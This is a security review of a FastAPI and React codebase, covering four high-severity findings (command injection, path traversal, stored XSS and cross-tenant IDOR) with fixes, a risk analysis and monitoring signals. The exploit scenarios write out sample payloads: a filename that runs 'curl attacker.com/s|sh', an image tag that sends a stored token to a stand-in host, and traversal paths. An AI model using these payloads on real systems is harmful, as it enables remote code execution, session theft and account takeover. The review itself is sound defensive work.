# Security Review — 2026-04-23

Scope: existing codebase on `main` at commit `4474393`. Focus: high-confidence, exploitable vulnerabilities in backend (FastAPI/Python) and frontend (React/TS).

## Summary

| # | Title | Severity | File |
|---|-------|----------|------|
| 1 | Authenticated RCE via Command Injection | High | [backend/app/api/upload.py](../backend/app/api/upload.py) |
| 2 | Path Traversal / Arbitrary File Write | High | [backend/app/api/upload.py](../backend/app/api/upload.py) |
| 3 | Stored XSS in Markdown Renderer | High | [frontend/src/components/MarkdownRenderer.tsx](../frontend/src/components/MarkdownRenderer.tsx) |
| 4 | Cross-Tenant IDOR → Account Takeover | High | [backend/app/api/organization.py](../backend/app/api/organization.py) |

---

## Vuln 1: Authenticated RCE via Command Injection

- **Location:** [backend/app/api/upload.py:46-59](../backend/app/api/upload.py#L46-L59), [69-79](../backend/app/api/upload.py#L69-L79), [88-103](../backend/app/api/upload.py#L88-L103)
- **Severity:** High
- **Category:** command_injection / code_injection

**Description.** The `/chat/upload` endpoint passes an attacker-controlled upload filename into a Python program executed via `subprocess.run(["python3", "-c", f"...'{file_path}'..."])`. `file_path` is derived from `UploadFile.filename` (saved at `uploads_dir / file.filename` with no sanitization) and substituted unescaped into a single-quoted Python string literal at lines 51, 57, 73, and 92. Although `shell=False` (argv form), an attacker supplies a filename containing a single quote to break out of the Python string literal and execute arbitrary Python. All three extraction branches (PDF, DOCX, XLSX/XLS) share the flaw.

**Exploit Scenario.** An authenticated user POSTs to `/api/chat/upload` with a multipart file whose filename is e.g. `foo.pdf');__import__('os').system('curl attacker.com/s|sh');#`. The file is saved with that literal name on disk. The backend then runs `python3 -c "import PyPDF2; ... PdfReader('<uploads>/foo.pdf');__import__('os').system('curl attacker.com/s|sh');#')..."` — the injected payload runs as the backend process user, yielding full RCE on the host.

**Recommendation.** Do not construct Python code via string interpolation. Either import the extraction libraries in-process, or pass the path as an argv argument to a dedicated extractor script and read it via `sys.argv[1]`. Additionally sanitize `file.filename` (strip path separators, quotes, control characters) and whitelist a safe character set.

---

## Vuln 2: Path Traversal / Arbitrary File Write

- **Location:** [backend/app/api/upload.py:121-140](../backend/app/api/upload.py#L121-L140)
- **Severity:** High
- **Category:** path_traversal

**Description.** The `/chat/upload` handler builds `save_path = WORKSPACE_ROOT / agent_id / "workspace" / "uploads" / file.filename` with no validation. `agent_id` is an unvalidated `Form("")` string (no UUID parsing, no `check_agent_access`, unlike every handler in [backend/app/api/files.py](../backend/app/api/files.py) which applies `_safe_path`). `file.filename` is used verbatim — the sibling sanitizer `filename.replace("/", "_")` from [backend/app/api/files.py:281](../backend/app/api/files.py#L281) is absent. `pathlib`'s `/` operator does not normalize, so `..` segments and absolute paths traverse out of the workspace root, and `mkdir(parents=True, exist_ok=True)` + `write_bytes(content)` yield arbitrary file write as the backend user.

**Exploit Scenario.** Any authenticated user sends `agent_id=../../../tmp` (or `filename=../../../../tmp/pwn`) and arbitrary content. The server creates intermediate directories and writes attacker-controlled bytes outside the agent workspace — enabling cross-tenant data poisoning for LLM context injection, overwriting other agents' workspaces, or dropping files into sensitive locations the backend user can reach (e.g., systemd units, cron files, SSH authorized_keys in containerized deployments). Chained with Vuln 1 it guarantees RCE without needing to discover an agent ID.

**Recommendation.** Parse `agent_id` as `uuid.UUID`, call `check_agent_access(db, current_user, agent_uuid)`, resolve the final path via `.resolve()`, and assert `str(resolved).startswith(str(uploads_dir.resolve()) + os.sep)` before any `mkdir`/`write_bytes`. Sanitize the filename with `os.path.basename` plus the `replace("/", "_").replace("\\", "_")` pattern used in [backend/app/api/files.py:281](../backend/app/api/files.py#L281).

---

## Vuln 3: Stored XSS in Markdown Renderer

- **Location:** [frontend/src/components/MarkdownRenderer.tsx:16-54](../frontend/src/components/MarkdownRenderer.tsx#L16-L54), [112](../frontend/src/components/MarkdownRenderer.tsx#L112), [180](../frontend/src/components/MarkdownRenderer.tsx#L180), [204](../frontend/src/components/MarkdownRenderer.tsx#L204)
- **Severity:** High
- **Category:** xss

**Description.** The custom `markdownToHtml` pipeline concatenates user-controlled strings directly into an HTML string and emits it via `dangerouslySetInnerHTML` (line 204). Only fenced code blocks are HTML-escaped (lines 88, 186); regular paragraphs, headings, lists, blockquotes, and tables pass through `renderInline`, which does not escape `<`, `>`, `&`, or `"` before concatenation. Link/image URLs are substituted unescaped into `href="${finalUrl}"` / `src="${finalUrl}"` (lines 37, 50), allowing `javascript:` schemes and attribute breakouts. The component is used for assistant chat messages ([frontend/src/pages/Chat.tsx:866](../frontend/src/pages/Chat.tsx#L866), [frontend/src/pages/AgentDetail.tsx:2252](../frontend/src/pages/AgentDetail.tsx#L2252)) and for rendering arbitrary `.md` workspace files ([frontend/src/components/FileBrowser.tsx:403](../frontend/src/components/FileBrowser.tsx#L403), [frontend/src/components/FileBrowser.tsx:459](../frontend/src/components/FileBrowser.tsx#L459)). The auth token is kept in `localStorage`, so XSS is directly account-takeover.

**Exploit Scenario.** A collaborator on a shared agent writes `<img src=x onerror="fetch('//evil/?t='+localStorage.token)">` into a workspace `.md` file (or induces the assistant to echo the raw HTML verbatim). When another collaborator opens that file or views the chat history, the browser executes the injected script and exfiltrates the victim's JWT, yielding full session hijack. IM integrations (Feishu/WeCom) that ingest external messages expand the reach beyond authenticated collaborators.

**Recommendation.** Replace the hand-rolled parser with `react-markdown` (no `rehype-raw`) or pipe the output of an established Markdown library through DOMPurify before `dangerouslySetInnerHTML`. At minimum: HTML-escape all unmatched text runs inside `renderInline`, escape `href`/`src`/alt/title values, and validate URL schemes against an `http(s):` / relative allowlist rejecting `javascript:`, `data:`, and `vbscript:`.

---

## Vuln 4: Cross-Tenant IDOR → Account Takeover

- **Location:** [backend/app/api/organization.py:45-106](../backend/app/api/organization.py#L45-L106)
- **Severity:** High
- **Category:** authorization_bypass / idor

**Description.** `PATCH /org/users/{user_id}` is guarded by `get_current_admin`, which per [backend/app/core/security.py:180-184](../backend/app/core/security.py#L180-L184) accepts both `platform_admin` and `org_admin`. The handler fetches the target user by primary key only and never checks `user.tenant_id == current_user.tenant_id`. The mutable fields (`email`, `username`, `primary_mobile`) are `association_proxy` attributes on `User` that write through to the **global** `Identity` row, which is the authentication root shared across tenants. The sibling `GET /org/users?tenant_id=<other>` handler at lines 21-42 also accepts a `tenant_id` query parameter from non-platform admins, letting an attacker enumerate victim UUIDs.

**Exploit Scenario.** An `org_admin` of tenant A lists users in tenant B (`GET /org/users?tenant_id=B`), then PATCHes a target user's `email` to an attacker-controlled address. They then call `/auth/forgot-password` ([backend/app/api/auth.py:586-635](../backend/app/api/auth.py#L586-L635)) which resolves by Identity email, receive the reset token, and take over the victim's account globally — across every tenant the Identity is attached to. Per-tenant uniqueness checks at lines 65-90 are scoped to the target user's tenant, so they do not block cross-tenant writes.

**Recommendation.** In `admin_update_user`, after loading the user, enforce `if current_user.role != "platform_admin" and user.tenant_id != current_user.tenant_id: raise HTTPException(404)`. Apply the same guard to `list_users` when a non-platform caller supplies `tenant_id`. Consider removing Identity-level fields (email/username/phone) from the tenant admin endpoint altogether, since they govern global authentication rather than tenant-scoped profile data.

---

## Risk Analysis

This section addresses the question: "can these findings be accepted without fixing, given our deployment assumptions?" It supplements — it does not replace — the per-vuln recommendations above. An adjacent proposal ([Proposal_Hardening_Clawith_with_OpenShell_to_NemoClaw_Equivalence](Proposal_Hardening_Clawith_with_OpenShell_to_NemoClaw_Equivalence/Proposal_Hardening_Clawith_with_OpenShell_to_NemoClaw_Equivalence.md)) proposes wrapping Clawith in an OpenShell sandbox for agent-runtime hardening; that proposal explicitly leaves Clawith's Python source unmodified and therefore does not address any of the four findings, all of which live in the control plane or frontend.

### 1. Attacker model — why "our users won't attack us" isn't a valid risk-acceptance argument

Every finding requires authentication only. Vulns 1, 2, and 3 fire for *any* authenticated user; Vuln 4 requires the `org_admin` role. A common argument for deferring these fixes is "the users of this deployment are employees we trust, so exploitation is unrealistic." That argument reduces to "no account in our user population is ever compromised during the deployment's lifetime" — which is a strictly stronger claim than "our employees are trustworthy," and is not supported by industry base rates. The realistic attacker set is therefore broader than "employees who decide to attack":

- **Compromised accounts** — credentials phished by adversary-in-the-middle kits (e.g. Evilginx-style) that proxy the full MFA handshake and exfiltrate the post-MFA session, or scraped by info-stealer malware on a user's personal device. The employee is entirely trustworthy; their session is now the attacker's.
- **Compromised endpoints** — malware on a laptop reads the browser's auth token from `localStorage` or the cookie jar.
- **Contractors and departing staff** — temporary accounts, or offboarded accounts whose removal lags.
- **Lateral-movement attackers** — an adversary with a foothold on some other corporate system (SaaS, VPN, AD) uses it to reach Clawith.
- **Actual malicious insiders** — less common, but the most damaging when they do occur.

Base rates (Verizon DBIR and similar sources, year after year) show that over the lifetime of any non-trivial user population at least one of these categories occurs. "Assume no account is ever compromised during deployment lifetime" is therefore not a defensible posture for any corporate environment handling non-trivial data.

### 2. Deployment-scenario severity matrix

Severity under various deployment assumptions, relative to the baseline. "High" / "Medium" are per the rubric already established in this review.

| Scenario | Vuln 1 RCE | Vuln 2 Path traversal | Vuln 3 Stored XSS | Vuln 4 IDOR |
|---|---|---|---|---|
| Baseline (internet-facing, multi-tenant) | High | High | High | High |
| Internal-only (corporate LAN) | High | High | High | High |
| Single-tenant, single-org | High | High | High | High (reshapes to `org_admin` → `platform_admin` role escalation) |
| Read-only / trusted-uploader-only | Medium-High | Medium-High | High | High |
| MFA + SSO + short-lived tokens | High | High | High | Medium (only if local forgot-password flow is genuinely disabled, not just hidden behind SSO as the preferred login) |
| Air-gapped browsers (no internet egress) | High | High | High | High → Medium (only if internal SMTP also broken) |

The table is flat because the structural gating is authentication, not network boundary or credential strength.

### 3. Why common mitigations don't move the needle

Five structural reasons the scenarios above don't meaningfully reduce severity:

1. **Auth gating, not network gating.** Every finding requires an authenticated session. Corporate firewalls, VPN-only access, and internal-network deployment narrow the *source IP* of attacks but not the *attacker set*, since the attacker set is "anyone with, or anyone who obtains, a valid Clawith session."
2. **MFA, SSO, and short token TTLs are credential-acquisition defenses.** They harden the act of *obtaining* a session. They do not limit what an already-authenticated session can do — which is exactly what insider threat, session-hijacking malware, and XSS exploit.
3. **Browser egress policy blocks naive XSS-to-internet exfil, not in-browser API chaining.** The dangerous XSS attack pattern in a modern application isn't `fetch('https://evil.com/?t=…')` — it's "call sensitive APIs inside the victim's live session." Network egress doesn't gate that; the victim's own browser does. Intra-app exfil (writing stolen data into attacker-readable Clawith resources) and LAN-internal exfil (to attacker-controlled corporate hosts) remain viable.
4. **Vuln 3 chains to Vuln 1 in a single browser tab.** Once an admin views attacker-planted content, the XSS payload can POST a malicious filename to `/chat/upload` within the same session — permanent backend RCE without crossing any network perimeter. The victim's token TTL is irrelevant because RCE is permanent.
5. **The cross-role variant of Vuln 4 survives single-tenancy.** With only one tenant the cross-tenant angle dissolves, but the underlying handler has no role check either — an `org_admin` can PATCH the `platform_admin`'s email, then drive `/auth/forgot-password` → `/auth/reset-password` to take over the highest-privilege account. Air-gapping browsers does not affect this server-side chain; it is only broken if internal email delivery is also unavailable, or if Clawith's local password-reset endpoints are genuinely disabled (many SSO integrations leave them mounted).

### 4. Compensating controls (if fixes are deferred)

These do not close the findings. They raise the detection probability and cap blast radius. Treat as temporary — not permanent substitutes for the recommendations in the per-vuln sections.

- **Monitoring signals with high specificity for these exploits:**
  - `/chat/upload` requests where the filename contains single quotes, backticks, null bytes, or control characters (Vulns 1 & 2).
  - `/chat/upload` with `agent_id` containing `..`, `/`, or a leading `\` (Vuln 2).
  - `PATCH /org/users/{id}` calls made by a user whose `role != "platform_admin"` whose target user is in a different `tenant_id` (Vuln 4). Also `GET /org/users?tenant_id=…` calls from non-platform admins.
  - Filesystem writes by the backend process outside the expected `WORKSPACE_ROOT` tree (Vulns 1 & 2).
- **Endpoint protection** (EDR / managed detection) on machines with Clawith access, so browser-token theft is more likely to be detected before the short-window exploit window closes.
- **Provisioning-based access restriction** — do not grant Clawith accounts to the full employee directory by default. The smaller the authorized population, the smaller the compromise surface.
- **Aggressive session TTLs** — not as prevention (XSS chains still fire in-session) but as a cap on replay windows if tokens are exfiltrated to external attackers.
- **Disable local forgot-password flow if SSO is mandatory** — explicitly remove or gate [backend/app/api/auth.py:586-635](../backend/app/api/auth.py#L586-L635) when SSO is in use. This breaks the Vuln 4 takeover chain at the escalation step, reducing it from full account takeover to profile tampering.
- **Treat IM-integration ingestion channels (Feishu / WeCom) as untrusted sources** for rendered content, since they let external users inject markdown that the unsafe renderer processes. If those integrations are enabled, the XSS risk (Vuln 3) includes external parties.

### 5. Fix economics

Rough per-finding engineering effort:

| Finding | Fix complexity | Effort |
|---|---|---|
| 1 — RCE via upload | Remove `python3 -c` f-string; use argv or in-process extraction; sanitize filename | 1–2 hours |
| 2 — Path traversal | Parse `agent_id` as UUID, call `check_agent_access`, add path containment check (pattern already used in [backend/app/api/files.py](../backend/app/api/files.py)) | ~1 hour |
| 3 — Stored XSS | Swap the hand-rolled Markdown parser for `react-markdown` + DOMPurify, or at minimum HTML-escape + URL-scheme whitelist | 3–4 hours |
| 4 — IDOR | Add tenant-equality and role-scope checks in `admin_update_user` and `list_users` | ~15 minutes |

Total: roughly one engineer-day.

Against that effort, the residual risk being accepted if left unfixed is: "any one compromised account — malware, phishing, insider, or lateral movement — anywhere in the Clawith user population, at any point in the deployment's lifetime, can obtain a backend shell and all stored credentials (JWT secret, provider API keys, integration tokens), or take over the platform admin account." The asymmetry favors fixing.
